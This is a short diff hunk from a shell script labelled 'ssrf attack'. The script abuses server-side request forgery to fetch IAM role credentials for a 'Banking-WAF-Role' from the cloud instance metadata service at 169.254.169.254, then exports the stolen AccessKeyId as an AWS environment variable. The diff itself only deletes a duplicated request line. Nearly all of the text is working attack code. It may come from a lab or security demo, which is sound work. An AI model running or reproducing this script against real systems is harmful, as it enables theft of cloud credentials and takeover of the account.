@@ -3,8 +3,6 @@ IP_ADDRESS=''
 echo 'ssrf attack'
 sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/Banking-WAF-Role -H 'Host:169.254.169.254')
 sleep 5
-sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/Banking-WAF-Role -H 'Host:169.254.169.254')
-sleep 5
 echo 'ssrf attack complete'
 
 export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' <<< ${sts_session})
